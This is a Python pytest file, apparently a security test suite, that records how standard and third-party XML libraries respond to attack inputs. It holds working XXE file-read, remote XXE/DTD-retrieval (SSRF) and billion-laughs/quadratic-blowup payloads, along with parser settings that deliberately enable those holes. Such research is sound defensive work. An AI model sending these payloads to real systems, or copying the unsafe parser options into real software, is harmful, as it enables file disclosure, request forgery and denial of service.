#!/usr/bin/env python3

# this file doesn't have a .py extension so the extractor doesn't pick it up, so it
# doesn't have to be annotated

# This file shows the ways to make exploit vulnerable XML parsing
# see
# https://pypi.org/project/defusedxml/#python-xml-libraries
# https://docs.python.org/3.10/library/xml.html#xml-vulnerabilities

import pathlib
from flask import Flask
import threading
import multiprocessing
import time
from io import StringIO
import pytest

HOST = "localhost"
PORT = 8080


FLAG_PATH = pathlib.Path(__file__).with_name("flag")

# ==============================================================================
# xml samples

ok_xml = f"""<?xml version="1.0"?>
<test>hello world</test>
"""

local_xxe = f"""<?xml version="1.0"?>
<!DOCTYPE dt [
    <!ENTITY xxe SYSTEM "file://{FLAG_PATH}">
]>
<test>&xxe;</test>
"""

remote_xxe = f"""<?xml version="1.0"?>
<!DOCTYPE dt [
    <!ENTITY remote_xxe SYSTEM "http://{HOST}:{PORT}/xxe">
]>
<test>&remote_xxe;</test>
"""

billion_laughs = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

quadratic_blowup = f"""<?xml version="1.0"?>
<!DOCTYPE wolo [
  <!ENTITY oops "{"a" * 100000}">
]>
<foo>{"&oops;"*20000}</foo>"""

dtd_retrieval = f"""<?xml version="1.0"?>
<!DOCTYPE dt PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://{HOST}:{PORT}/test.dtd">
<foo>bar</foo>
"""

# ==============================================================================
# other setup

# we set up local Flask application so we can tests whether loading external resources
# works (such as SSRF from DTD-retrival works)
app = Flask(__name__)

@app.route("/alive")
def alive():
    return "ok"

hit_dtd = False
@app.route("/test.dtd")
def test_dtd():
    global hit_dtd
    hit_dtd = True
    return """<?xml version="1.0" encoding="UTF-8"?>"""

hit_xxe = False
@app.route("/xxe")
def test_xxe():
    global hit_xxe
    hit_xxe = True
    return "ok"

def run_app():
    app.run(host=HOST, port=PORT)

@pytest.fixture(scope="session", autouse=True)
def flask_app_running():
    # run flask in other thread
    flask_thread = threading.Thread(target=run_app, daemon=True)
    flask_thread.start()

    # give flask a bit of time to start
    time.sleep(0.1)

    # ensure that the server works
    import requests
    requests.get(f"http://{HOST}:{PORT}/alive")

    yield

def expects_timeout(func):
    def inner():
        proc = multiprocessing.Process(target=func)
        proc.start()
        time.sleep(0.1)
        assert proc.exitcode == None
        proc.kill()
        proc.join()
    return inner


class TestExpectsTimeout:
    "test that expects_timeout works as expected"

    @staticmethod
    @expects_timeout
    def test_slow():
        time.sleep(1000)

    @staticmethod
    def test_fast():
        @expects_timeout
        def fast_func():
            return "done!"

        with pytest.raises(AssertionError):
            fast_func()

# ==============================================================================
import xml.sax
import xml.sax.handler

class SimpleHandler(xml.sax.ContentHandler):
    def __init__(self):
        self.result = []

    def characters(self, data):
        self.result.append(data)

class TestSax():
    # always vuln to billion laughs, quadratic

    @staticmethod
    @expects_timeout
    def test_billion_laughs_allowed_by_default():
        parser = xml.sax.make_parser()
        parser.parse(StringIO(billion_laughs))

    @staticmethod
    @expects_timeout
    def test_quardratic_blowup_allowed_by_default():
        parser = xml.sax.make_parser()
        parser.parse(StringIO(quadratic_blowup))

    @staticmethod
    def test_ok_xml():
        handler = SimpleHandler()
        parser = xml.sax.make_parser()
        parser.setContentHandler(handler)
        parser.parse(StringIO(ok_xml))
        assert handler.result == ["hello world"], handler.result

    @staticmethod
    def test_xxe_disabled_by_default():
        handler = SimpleHandler()
        parser = xml.sax.make_parser()
        parser.setContentHandler(handler)
        parser.parse(StringIO(local_xxe))
        assert handler.result == [], handler.result

    @staticmethod
    def test_local_xxe_manually_enabled():
        handler = SimpleHandler()
        parser = xml.sax.make_parser()
        parser.setContentHandler(handler)
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        parser.parse(StringIO(local_xxe))
        assert handler.result[0] == "SECRET_FLAG", handler.result

    @staticmethod
    def test_remote_xxe_manually_enabled():
        global hit_xxe
        hit_xxe = False

        handler = SimpleHandler()
        parser = xml.sax.make_parser()
        parser.setContentHandler(handler)
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        parser.parse(StringIO(remote_xxe))
        assert handler.result == ["ok"], handler.result
        assert hit_xxe == True

    @staticmethod
    def test_dtd_disabled_by_default():
        global hit_dtd
        hit_dtd = False

        parser = xml.sax.make_parser()
        parser.parse(StringIO(dtd_retrieval))
        assert hit_dtd == False

    @staticmethod
    def test_dtd_manually_enabled():
        global hit_dtd
        hit_dtd = False

        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        parser.parse(StringIO(dtd_retrieval))
        assert hit_dtd == True


# ==============================================================================
import xml.etree.ElementTree

class TestEtree:

    # always vuln to billion laughs, quadratic
    @staticmethod
    @expects_timeout
    def test_billion_laughs_allowed_by_default():
        parser = xml.etree.ElementTree.XMLParser()
        _root = xml.etree.ElementTree.fromstring(billion_laughs, parser=parser)

    @staticmethod
    @expects_timeout
    def test_quardratic_blowup_allowed_by_default():
        parser = xml.etree.ElementTree.XMLParser()
        _root = xml.etree.ElementTree.fromstring(quadratic_blowup, parser=parser)

    @staticmethod
    def test_ok_xml():
        parser = xml.etree.ElementTree.XMLParser()
        root = xml.etree.ElementTree.fromstring(ok_xml, parser=parser)
        assert root.tag == "test"
        assert root.text == "hello world"

    @staticmethod
    def test_ok_xml_sax_parser():
        # you _can_ pass a SAX parser to xml.etree... but it doesn't give you the output :|
        parser = xml.sax.make_parser()
        root = xml.etree.ElementTree.fromstring(ok_xml, parser=parser)
        assert root == None

    @staticmethod
    def test_ok_xml_lxml_parser():
        # this is technically possible, since parsers follow the same API, and the
        # `fromstring` function is just a thin wrapper... seems very unlikely that
        # anyone would do this though :|
        parser = lxml.etree.XMLParser()
        root = xml.etree.ElementTree.fromstring(ok_xml, parser=parser)
        assert root.tag == "test"
        assert root.text == "hello world"

    @staticmethod
    def test_xxe_not_possible():
        parser = xml.etree.ElementTree.XMLParser()
        try:
            _root = xml.etree.ElementTree.fromstring(local_xxe, parser=parser)
            assert False
        except xml.etree.ElementTree.ParseError as e:
            assert "undefined entity &xxe" in str(e)

    @staticmethod
    def test_dtd_not_possible():
        global hit_dtd
        hit_dtd = False

        parser = xml.etree.ElementTree.XMLParser()
        _root = xml.etree.ElementTree.fromstring(dtd_retrieval, parser=parser)
        assert hit_dtd == False

# ==============================================================================
import lxml.etree

class TestLxml:
    # see https://lxml.de/apidoc/lxml.etree.html?highlight=xmlparser#lxml.etree.XMLParser
    @staticmethod
    def test_billion_laughs_disabled_by_default():
        parser = lxml.etree.XMLParser()
        try:
            _root = lxml.etree.fromstring(billion_laughs, parser=parser)
            assert False
        except lxml.etree.XMLSyntaxError as e:
            assert "Detected an entity reference loop" in str(e)

    @staticmethod
    def test_quardratic_blowup_disabled_by_default():
        parser = lxml.etree.XMLParser()
        try:
            _root = lxml.etree.fromstring(quadratic_blowup, parser=parser)
            assert False
        except lxml.etree.XMLSyntaxError as e:
            assert "Detected an entity reference loop" in str(e)

    @staticmethod
    @expects_timeout
    def test_billion_laughs_manually_enabled():
        parser = lxml.etree.XMLParser(huge_tree=True)
        root = lxml.etree.fromstring(billion_laughs, parser=parser)

    @staticmethod
    @expects_timeout
    def test_quadratic_blowup_manually_enabled():
        parser = lxml.etree.XMLParser(huge_tree=True)
        root = lxml.etree.fromstring(quadratic_blowup, parser=parser)

    @staticmethod
    def test_billion_laughs_huge_tree_not_enough():
        parser = lxml.etree.XMLParser(huge_tree=True, resolve_entities=False)
        root = lxml.etree.fromstring(billion_laughs, parser=parser)
        assert root.tag == "lolz"
        assert root.text == None

    @staticmethod
    def test_quadratic_blowup_huge_tree_not_enough():
        parser = lxml.etree.XMLParser(huge_tree=True, resolve_entities=False)
        root = lxml.etree.fromstring(quadratic_blowup, parser=parser)
        assert root.tag == "foo"
        assert root.text == None

    @staticmethod
    def test_ok_xml():
        parser = lxml.etree.XMLParser()
        root = lxml.etree.fromstring(ok_xml, parser=parser)
        assert root.tag == "test"
        assert root.text == "hello world"

    @staticmethod
    def test_local_xxe_enabled_by_default():
        parser = lxml.etree.XMLParser()
        root = lxml.etree.fromstring(local_xxe, parser=parser)
        assert root.tag == "test"
        assert root.text == "SECRET_FLAG\n", root.text

    @staticmethod
    def test_local_xxe_disabled():
        parser = lxml.etree.XMLParser(resolve_entities=False)
        root = lxml.etree.fromstring(local_xxe, parser=parser)
        assert root.tag == "test"
        assert root.text == None

    @staticmethod
    def test_remote_xxe_disabled_by_default():
        global hit_xxe
        hit_xxe = False

        parser = lxml.etree.XMLParser()
        try:
            root = lxml.etree.fromstring(remote_xxe, parser=parser)
            assert False
        except lxml.etree.XMLSyntaxError as e:
            assert "Failure to process entity remote_xxe" in str(e)
        assert hit_xxe == False

    @staticmethod
    def test_remote_xxe_manually_enabled():
        global hit_xxe
        hit_xxe = False

        parser = lxml.etree.XMLParser(no_network=False)
        root = lxml.etree.fromstring(remote_xxe, parser=parser)
        assert root.tag == "test"
        assert root.text == "ok"
        assert hit_xxe == True

    @staticmethod
    def test_dtd_disabled_by_default():
        global hit_dtd
        hit_dtd = False

        parser = lxml.etree.XMLParser()
        root = lxml.etree.fromstring(dtd_retrieval, parser=parser)
        assert hit_dtd == False

    @staticmethod
    def test_dtd_manually_enabled():
        global hit_dtd
        hit_dtd = False

        # Need to set BOTH load_dtd and no_network
        parser = lxml.etree.XMLParser(load_dtd=True)
        root = lxml.etree.fromstring(dtd_retrieval, parser=parser)
        assert hit_dtd == False

        parser = lxml.etree.XMLParser(no_network=False)
        root = lxml.etree.fromstring(dtd_retrieval, parser=parser)
        assert hit_dtd == False

        parser = lxml.etree.XMLParser(load_dtd=True, no_network=False)
        root = lxml.etree.fromstring(dtd_retrieval, parser=parser)
        assert hit_dtd == True

        hit_dtd = False

        # Setting dtd_validation also does not allow the remote access
        parser = lxml.etree.XMLParser(dtd_validation=True, load_dtd=True)
        try:
            root = lxml.etree.fromstring(dtd_retrieval, parser=parser)
        except lxml.etree.XMLSyntaxError:
            pass
        assert hit_dtd == False


# ==============================================================================

import xmltodict

class TestXmltodict:
    @staticmethod
    def test_billion_laughs_disabled_by_default():
        d = xmltodict.parse(billion_laughs)
        assert d == {"lolz": None}, d

    @staticmethod
    def test_quardratic_blowup_disabled_by_default():
        d = xmltodict.parse(quadratic_blowup)
        assert d == {"foo": None}, d

    @staticmethod
    @expects_timeout
    def test_billion_laughs_manually_enabled():
        xmltodict.parse(billion_laughs, disable_entities=False)

    @staticmethod
    @expects_timeout
    def test_quardratic_blowup_manually_enabled():
        xmltodict.parse(quadratic_blowup, disable_entities=False)

    @staticmethod
    def test_ok_xml():
        d = xmltodict.parse(ok_xml)
        assert d == {"test": "hello world"}, d

    @staticmethod
    def test_local_xxe_not_possible():
        d = xmltodict.parse(local_xxe)
        assert d == {"test": None}

        d = xmltodict.parse(local_xxe, disable_entities=False)
        assert d == {"test": None}

    @staticmethod
    def test_remote_xxe_not_possible():
        global hit_xxe
        hit_xxe = False

        d = xmltodict.parse(remote_xxe)
        assert d == {"test": None}
        assert hit_xxe == False

        d = xmltodict.parse(remote_xxe, disable_entities=False)
        assert d == {"test": None}
        assert hit_xxe == False

    @staticmethod
    def test_dtd_not_possible():
        global hit_dtd
        hit_dtd = False

        d = xmltodict.parse(dtd_retrieval)
        assert hit_dtd == False

# ==============================================================================
import xml.dom.minidom

class TestMinidom:
    @staticmethod
    @expects_timeout
    def test_billion_laughs():
        xml.dom.minidom.parseString(billion_laughs)

    @staticmethod
    @expects_timeout
    def test_quardratic_blowup():
        xml.dom.minidom.parseString(quadratic_blowup)

    @staticmethod
    def test_ok_xml():
        doc = xml.dom.minidom.parseString(ok_xml)
        assert doc.documentElement.tagName == "test"
        assert doc.documentElement.childNodes[0].data == "hello world"

    @staticmethod
    def test_xxe():
        # disabled by default
        doc = xml.dom.minidom.parseString(local_xxe)
        assert doc.documentElement.tagName == "test"
        assert doc.documentElement.childNodes == []

        # but can be turned on
        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        doc = xml.dom.minidom.parseString(local_xxe, parser=parser)
        assert doc.documentElement.tagName == "test"
        assert doc.documentElement.childNodes[0].data == "SECRET_FLAG"

        # which also works remotely
        global hit_xxe
        hit_xxe = False

        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        _doc = xml.dom.minidom.parseString(remote_xxe, parser=parser)
        assert hit_xxe == True

    @staticmethod
    def test_dtd():
        # not possible by default
        global hit_dtd
        hit_dtd = False

        _doc = xml.dom.minidom.parseString(dtd_retrieval)
        assert hit_dtd == False

        # but can be turned on
        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        _doc = xml.dom.minidom.parseString(dtd_retrieval, parser=parser)
        assert hit_dtd == True

# ==============================================================================
import xml.dom.pulldom

class TestPulldom:
    @staticmethod
    @expects_timeout
    def test_billion_laughs():
        doc = xml.dom.pulldom.parseString(billion_laughs)
        # you NEED to iterate over the items for it to take long
        for event, node in doc:
            pass

    @staticmethod
    @expects_timeout
    def test_quardratic_blowup():
        doc = xml.dom.pulldom.parseString(quadratic_blowup)
        for event, node in doc:
            pass

    @staticmethod
    def test_ok_xml():
        doc = xml.dom.pulldom.parseString(ok_xml)
        for event, node in doc:
            if event == xml.dom.pulldom.START_ELEMENT:
                assert node.tagName == "test"
            elif event == xml.dom.pulldom.CHARACTERS:
                assert node.data == "hello world"

    @staticmethod
    def test_xxe():
        # disabled by default
        doc = xml.dom.pulldom.parseString(local_xxe)
        found_flag = False
        for event, node in doc:
            if event == xml.dom.pulldom.START_ELEMENT:
                assert node.tagName == "test"
            elif event == xml.dom.pulldom.CHARACTERS:
                if node.data == "SECRET_FLAG":
                    found_flag = True
        assert found_flag == False

        # but can be turned on
        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        doc = xml.dom.pulldom.parseString(local_xxe, parser=parser)
        found_flag = False
        for event, node in doc:
            if event == xml.dom.pulldom.START_ELEMENT:
                assert node.tagName == "test"
            elif event == xml.dom.pulldom.CHARACTERS:
                if node.data == "SECRET_FLAG":
                    found_flag = True
        assert found_flag == True

        # which also works remotely
        global hit_xxe
        hit_xxe = False
        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        doc = xml.dom.pulldom.parseString(remote_xxe, parser=parser)
        assert hit_xxe == False
        for event, node in doc:
            pass
        assert hit_xxe == True

    @staticmethod
    def test_dtd():
        # not possible by default
        global hit_dtd
        hit_dtd = False

        doc = xml.dom.pulldom.parseString(dtd_retrieval)
        for event, node in doc:
            pass
        assert hit_dtd == False

        # but can be turned on
        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        doc = xml.dom.pulldom.parseString(dtd_retrieval, parser=parser)
        for event, node in doc:
            pass
        assert hit_dtd == True

# ==============================================================================
import xml.parsers.expat

class TestExpat:
    # this is the underlying parser implementation used by the rest of the Python
    # standard library. But people are probably not using this directly.

    @staticmethod
    @expects_timeout
    def test_billion_laughs():
        parser = xml.parsers.expat.ParserCreate()
        parser.Parse(billion_laughs, True)

    @staticmethod
    @expects_timeout
    def test_quardratic_blowup():
        parser = xml.parsers.expat.ParserCreate()
        parser.Parse(quadratic_blowup, True)

    @staticmethod
    def test_ok_xml():
        char_data_recv = []
        def char_data_handler(data):
            char_data_recv.append(data)

        parser = xml.parsers.expat.ParserCreate()
        parser.CharacterDataHandler = char_data_handler
        parser.Parse(ok_xml, True)

        assert char_data_recv == ["hello world"]

    @staticmethod
    def test_xxe():
        # not vuln by default
        char_data_recv = []
        def char_data_handler(data):
            char_data_recv.append(data)

        parser = xml.parsers.expat.ParserCreate()
        parser.CharacterDataHandler = char_data_handler
        parser.Parse(local_xxe, True)

        assert char_data_recv == []

        # there might be ways to make it vuln, but I did not investigate futher.

    @staticmethod
    def test_dtd():
        # not vuln by default
        global hit_dtd
        hit_dtd = False

        parser = xml.parsers.expat.ParserCreate()
        parser.Parse(dtd_retrieval, True)
        assert hit_dtd == False

        # there might be ways to make it vuln, but I did not investigate futher.
